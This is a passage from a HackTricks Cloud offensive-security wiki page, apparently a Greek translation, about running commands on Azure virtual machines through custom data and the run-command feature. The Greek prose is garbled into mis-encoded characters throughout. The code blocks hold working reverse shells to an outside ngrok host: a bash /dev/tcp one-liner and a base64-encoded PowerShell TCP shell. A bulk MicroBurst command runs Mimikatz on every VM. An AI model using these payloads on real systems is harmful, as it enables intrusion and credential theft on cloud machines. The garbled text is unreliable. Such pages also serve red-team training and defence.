Î‘Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹ **Î¼ÏŒÎ½Î¹Î¼Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Î±ÎºÏ„Î·Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿ ÏƒÎ·Î¼ÎµÎ¯Î¿ Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÏƒÏ„Î¹Î³Î¼Î®. Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÏ„Î¿ Azure Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿ AWS ÎºÎ±Î¹ Ï„Î¿ GCP ÎµÏ€ÎµÎ¹Î´Î® **Î±Î½ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎµÎ´Ï, Î´ÎµÎ½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®**.

### Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€ÎµÏÎ¬ÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î· VM Ï€Î¿Ï… Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„Î¿ÏÎ½ ÏƒÎµ Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚:

* Î£Ï„Î± **Windows**, Ï„Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ `%SYSTEMDRIVE%\AzureData\CustomData.bin` Ï‰Ï‚ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Î¹ Î´ÎµÎ½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹.
* Î£Ï„Î¿ **Linux**, Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î½ ÏƒÏ„Î¿ `/var/lib/waagent/ovf-env.xml` ÎºÎ±Î¹ Ï„ÏÏÎ± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ `/var/lib/waagent/CustomData/ovf-env.xml`
* **Linux agent**: Î”ÎµÎ½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎµÎ¹ÎºÏŒÎ½Î± Î¼Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î±
* **cloud-init:** Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎºÎ±Î¹ Î±Ï…Ï„Î¬ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ [**Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Î¼Î¿ÏÏ†Î­Ï‚**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html). ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎµÏÎºÎ¿Î»Î± ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î±Ï€Î»ÏÏ‚ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÏƒÏ„Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±.
* Î”Î¿ÎºÎ¯Î¼Î±ÏƒÎ± ÏŒÏ„Î¹ Ï„ÏŒÏƒÎ¿ Ï„Î¿ Ubuntu ÏŒÏƒÎ¿ ÎºÎ±Î¹ Ï„Î¿ Debian ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Îµ ÎµÎ´Ï.
* Î”ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï‡ÏÎ®ÏƒÏ„Î· Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î±Ï…Ï„ÏŒ.
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î•Î½Ï„Î¿Î»Î®Ï‚**

Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ Ï€Î¹Î¿ Î²Î±ÏƒÎ¹ÎºÏŒÏ‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï„Î¿ Azure Î³Î¹Î± **Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Ï‰Î½ ÎµÎ½Ï„Î¿Î»ÏÎ½ ÏƒÎµ VMs**. Î— Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î· Î¬Î´ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ `Microsoft.Compute/virtualMachines/runCommand/action`.

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î”Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## ÎœÎ· Î‘Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î ÏÏŒÏƒÎ²Î±ÏƒÎ·

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## ÎœÎµÏ„Î¬ Ï„Î·Î½ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## Î•Ï€Î¹Î¼Î¿Î½Î®

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
